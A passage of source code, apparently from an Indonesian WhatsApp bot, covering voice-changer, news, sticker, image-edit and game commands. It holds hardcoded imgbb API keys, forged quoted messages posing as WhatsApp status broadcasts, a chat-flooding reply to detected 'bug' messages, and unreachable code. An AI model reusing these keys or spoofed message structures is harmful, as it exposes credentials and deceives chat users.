
fs.unlinkSync(media)

if (err) return reply('Error!')

res = fs.readFileSync(ran)

Repor.sendMessage(from, res, audio, { mimetype: "audio/mp4", ptt: true, quoted: fakevn})

fs.unlinkSync(ran)

	})

break

//ghost  Bernada Serem Dan Menakutkan
case prefix+ 'ghost':
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
					media = await Repor.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(media)
					if (err) return reply('Error!')
					hah = fs.readFileSync(ran)
					Repor.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted : fakevn})
                    fs.unlinkSync(ran)
				    })
		            break
		            

case prefix+ 'hode':
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : revz
					media = await Repor.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Repor.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: fakevn})
						fs.unlinkSync(ran)
					})
				break
				
				case prefix+ 'robot':

encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : revz

	media = await Repor.downloadAndSaveMediaMessage(encmedia)

ran = getRandom('.mp3')

exec(`ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {

fs.unlinkSync(media)

if (err) return reply('Error!')

res = fs.readFileSync(ran)

Repor.sendMessage(from, res, audio, { mimetype: "audio/mp4", ptt: true, quoted: fakevn})

fs.unlinkSync(ran)

})

break

case prefix+ 'imut':

	encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : revz 

	media = await Repor.downloadAndSaveMediaMessage(encmedia)

	ran = getRandom('.mp3')

	exec(`ffmpeg -i ${media} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, (err, stderr, stdout) => {

fs.unlinkSync(media)

if (err) return reply('Error!')

res = fs.readFileSync(ran)

Repor.sendMessage(from, res, audio, { mimetype: "audio/mp4", ptt: true, quoted: fakevn})

fs.unlinkSync(ran)

	})

break

					//********** NEWS **********//
					case prefix+ 'cnnindonesia':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cnnindonesia?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case prefix+ 'cnnnasional':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                    case prefix+ 'newsinfo':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/newsinfo?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Author : ${x.author}\n`
                        ini_txt += `Source : ${x.source.name}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Published : ${x.publishedAt}\n`
                        ini_txt += `Description : ${x.description}\n\n`
                    }
                    reply(ini_txt)
                    break
                    case prefix+ 'kumparan':
		
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kumparan?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Url : ${x.link}\n`
                        ini_txt += `Description : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break
                    case prefix+ 'liputan6':
		
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/liputan6?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Desc : ${x.desc}\n`
                        ini_txt += `Category : ${x.category}\n`
                        ini_txt += `Published : ${x.publish}\n`
                        }
                    reply(ini_txt)
                    break
                    if ((Object.keys(revz.message)[0] === 'ephemeralMessage' && JSON.stringify(revz.message).includes('EPHEMERAL_SETTING')) && revz.message.ephemeralMessage.message.protocolMessage.type === 3) {
 bugsol = revz.participant[0]
 tekuss = `Nizam The Best






















 
 




























































































\`\`\`BUGGC TERDETEKSI\`\`\`
_@⁨${bugsol.split('@')[0]} akan dikick_

_Clear chat by Repor_
*Woi bang donasi lah*`
 Repor.sendMessage(revz.key.remoteJid, 'WAH BUG NIH', MessageType.text)
 Repor.sendMessage(revz.key.remoteJid, tekuss, MessageType.text, { contexInfo: { mentionedJid:[bugsol] }})
}
                   
                   //********** STICKER EDIT**********//
                   case prefix+ 'stickjail':
if (revz.message.extendedTextMessage != undefined || revz.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgi = await Repor.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickjail.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", './stickjail.jpeg')
teks = `${anu.display_url}`
sendStickerFromUrl(from, `https://pecundang.herokuapp.com/api/jail?url=${teks}`, revz)
fs.unlinkSync('./stickjail.jpeg')
}
break
case prefix+ 'stickburik':
if (revz.message.extendedTextMessage != undefined || revz.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgi = await Repor.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickbrk.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", './stickbrk.jpeg')
teks = `${anu.display_url}`
sendStickerFromUrl(from, `https://pecundang.herokuapp.com/api/pixelate?url=${teks}`, revz)
fs.unlinkSync('./stickbrk.jpeg')
}
break
case prefix+ 'stickrip':
if (revz.message.extendedTextMessage != undefined || revz.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgi = await Repor.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickrip.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", './stickrip.jpeg')
teks = `${anu.display_url}`
sendStickerFromUrl(from, `https://pecundang.herokuapp.com/api/rip?url=${teks}`, revz)
fs.unlinkSync('./stickrip.jpeg')
}
break
case prefix+ 'stickwasted':
if (revz.message.extendedTextMessage != undefined || revz.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgi = await Repor.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickwtd.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", './stickwtd.jpeg')
teks = `${anu.display_url}`
sendStickerFromUrl(from, `https://pecundang.herokuapp.com/api/wanted?url=${teks}`, revz)
fs.unlinkSync('./stickwtd.jpeg')
}
break

case prefix+  'trigger':
        
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : revz
					reply(mess.wait)
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
					owgi = await  Repor.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Repor.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: troli})
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
case prefix+ 'stickgay':
if (revz.message.extendedTextMessage != undefined || revz.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgi = await Repor.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickgay.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", './stickgay.jpeg')
teks = `${anu.display_url}`
sendStickerFromUrl(from, `https://pecundang.herokuapp.com/api/gay?url=${teks}`, revz)
fs.unlinkSync('./stickgay.jpeg')
}
break
         //********** IMAGE EDIT **********//
         case prefix+ 'imageflip':
	
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: revz
	  reply('[😎🙏] WAIT PROSES SLOER..')
	  owgi = await Repor.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(11)
	  anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/flip?apikey=${LolKey}&img=${anu.display_url}`)
	  Repor.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Z A M  B O T*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/fakenya.jpeg')} } }, caption: 'Nih Hasilnya Kak...'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	
	case prefix+ 'imagerotate':
	
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: revz
	  reply('[😎🙏] WAIT PROSES SLOER..')
	  owgi = await Repor.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(13)
	  anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/rotate?apikey=${LolKey}&img=${anu.display_url}`)
	  Repor.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Z A M  B O T*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/fakenya.jpeg')} } }, caption: 'Nih Hasilnya Kak...'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case prefix+ 'affect':
	
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: revz
	  reply('[😎🙏] WAIT PROSES SLOER..')
	  owgi = await Repor.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(8)
	  anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", owgi)
	  hehe = await getBuffer(`https://api.lolhuman.xyz/api/creator1/affect?apikey=${LolKey}&img=${anu.display_url}`)
	  Repor.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Z A M  B O T*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/fakenya.jpeg')} } }, caption: 'Nih Hasilnya Kak...'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break

case prefix+ 'sepia':
	
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: revz
	  reply('[😎🙏] WAIT PROSES SLOER..')
	  owgi = await Repor.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", owgi)
	  hehe = await getBuffer(`https://api.lolhuman.xyz/api/creator1/sepia?apikey=${LolKey}&img=${anu.display_url}`)
	 Repor.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Z A M  B O T*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/fakenya.jpeg')} } }, caption: 'Nih Hasilnya Kak...'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	
	case prefix+ 'removebg':
	
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: revz
	  reply('[😎🙏] WAIT PROSES SLOER..')
	  owgi = await Repor.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(10)
	  anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/removebg?apikey=${LolKey}&img=${anu.display_url}`)
	 Repor.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Z A M  B O T*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/fakenya.jpeg')} } }, caption: 'Nih Hasilnya Kak...'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	
	case prefix+ 'fisheye':
	
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: revz
	  reply('[😎🙏] WAIT PROSES SLOER..')
	  owgi = await Repor.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(9)
	  anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/fisheye?apikey=${LolKey}&img=${anu.display_url}`)
	  Repor.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Z A M  B O T*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/fakenya.jpeg')} } }, caption: 'Nih Hasilnya Kak...'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	
case prefix+ 'jail':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
						ger = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : lol
						owgi = await Repor.downloadAndSaveMediaMessage(ger)
						data = await imgbb("a7b8549b971be7526e684cda76fbbab8", owgi)
						buff = await getBuffer(`https://api.lolhuman.xyz/api/creator1/jail?apikey=${LolKey}&img=${data.display_url}`)
						Repor.sendMessage(from, buff, image, {quoted: ftoko, caption: 'NIH KAK'})
					} else {
						reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}wasted`)
					}
					break
				
	

				case prefix+ 'wanted':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
						ger = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : lol
						owgi = await Repor.downloadAndSaveMediaMessage(ger)
						data = await imgbb("a7b8549b971be7526e684cda76fbbab8", owgi)
						buff = await getBuffer(`https://api.lolhuman.xyz/api/creator1/wanted?apikey=${LolKey}&img=${data.display_url}`)
						Repor.sendMessage(from, buff, image, {quoted: ftoko, caption: 'NIH KAK'})
					} else {
						reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}wanted`)
					}
					break
	
         
case prefix+ 'pixelate':
	
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: revz
	  reply('[😎🙏] WAIT PROSES SLOER..')
	  owgi = await Repor.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(10)
	  anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/pixelate?apikey=${LolKey}&img=${anu.display_url}`)
	  Repor.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Z A M  B O T*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/fakenya.jpeg')} } }, caption: 'Nih Hasilnya Kak...'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	
	case prefix+ 'hitler':

	var imgbb = require('imgbb-uploader')
	if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: revz
	  reply('[😎🙏] WAIT PROSES SLOER')
	  owgi = await Repor.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", owgi)
	  hehe = await getBuffer(`https://api.lolhuman.xyz/api/creator1/hitler?apikey=${LolKey}&img=${anu.display_url}`)
	 Repor.sendMessage(from, hehe, image, {quoted:revz})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case prefix+ 'trash':

	var imgbb = require('imgbb-uploader')
	if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: revz
	  reply('[😎🙏] WAIT PROSES SLOER')
	  owgi = await Repor.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", owgi)
	  hehe = await getBuffer(`https://api.lolhuman.xyz/api/creator1/trash?apikey=${LolKey}&img=${anu.display_url}`)
	 Repor.sendMessage(from, hehe, image, {quoted:revz})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break

           
					/*-------------[ Tictactoe Handler ]-------------*/
                case prefix+  'tictactoe':
                    if (fs.existsSync(`./lib/tictactoe/db/${from}.json`)) {
                         const boardnow = setGame(`${from}`);
                         const matrix = boardnow._matrix;
                         const chatMove = `*🎮 Tictactoe Game 🎳*
     
     Sedang ada sesi permainan digrup ini\n\n@${boardnow.X} VS @${boardnow.O}
     
     ❌ : @${boardnow.X}
     ⭕ : @${boardnow.O}
     
     Giliran : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
     
     
          ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
          ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
          ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
     
     
     `;
                         Repor.sendMessage(from, chatMove, MessageType.text, {
                              quoted: revz,
                              contextInfo: {
                                   mentionedJid: [
                                        boardnow.X + "@s.whatsapp.net",
                                        boardnow.O + "@s.whatsapp.net",
                                   ],
                              },
                         });
                         return;
                    }
                    if (argss.length === 1)
                         return reply(
                              `Tag yang ingin jadi lawan anda!\n\nPenggunaan : *#tictactoe <@TagMember>*`
                         );
                    const boardnow = setGame(`${from}`);
                    console.log(`Start Tictactore ${boardnow.session}`);
                    boardnow.status = false;
                    boardnow.X = sender.replace("@s.whatsapp.net", "");
                    boardnow.O = argss[1].replace("@", "");
                    fs.writeFileSync(
                         `./lib/tictactoe/db/${from}.json`,
                         JSON.stringify(boardnow, null, 2)
                    );
                    const strChat = `*🎮 Memulai game tictactoe 🎳*
     
     @${sender.replace(
                         "@s.whatsapp.net",
                         ""
                    )} menantang anda untuk menjadi lawan game
     
     _[ ${argss[1]} ] Ketik Y/N untuk menerima atau menolak permainan_ 
     `;
                    Repor.sendMessage(from, strChat, MessageType.text, {
                         quoted: revz,
                         contextInfo: {
                              mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
                         },
                    });
                    break
               case prefix+  'delttc':
                    // if(!isOwner && !revz.key.fromMe) return vean.sendMessage(id, yan, MessageType.text);
                    if (fs.existsSync("./lib/tictactoe/db/" + from + ".json")) {
                         fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");
                         reply(`Berhasil menghapus sesi di grup ini!`);
                    } else {
                         reply(`Tidak ada sesi yg berlangsung, mohon ketik .tictactoe`);
                    }
                    break
                    case prefix+ 'tebakgambar':
					
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/gambar?apikey=${LolKey}`, {method: 'get'})
					bufferkkk = await getBuffer(anu.result.image)
					setTimeout( () => {
					Repor.sendMessage(from, '*➸ Jawaban :* '+anu.result.answer, text, {quoted: revz}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					Repor.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					Repor.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					Repor.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					Repor.sendMessage(from, bufferkkk, image, { caption: '_Jelaskan Apa Maksud Gambar Ini_', quoted: revz}) // ur cods
					}, 0) // 1000 = 1s,
					break  
				case prefix+ 'family100':
					
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${LolKey}`, {method: 'get'})
					family = `*${anu.result.question}*`
					setTimeout( () => {
					Repor.sendMessage(from, '*➸ Jawaban :* '+anu.result.aswer, text, {quoted: revz}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					Repor.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					Repor.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					Repor.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					Repor.sendMessage(from, family, text, {quoted: revz}) // ur cods
					}, 0) // 1000 = 1s,
					break
					case prefix+ 'caklontong':
					
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/caklontong?apikey=${LolKey}`, {method: 'get'})
					caklontong = `*${anu.result.question}*`
					setTimeout( () => {
					Repor.sendMessage(from, '*➸ Jawaban :* '+anu.result.answer, text, {quoted: revz}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
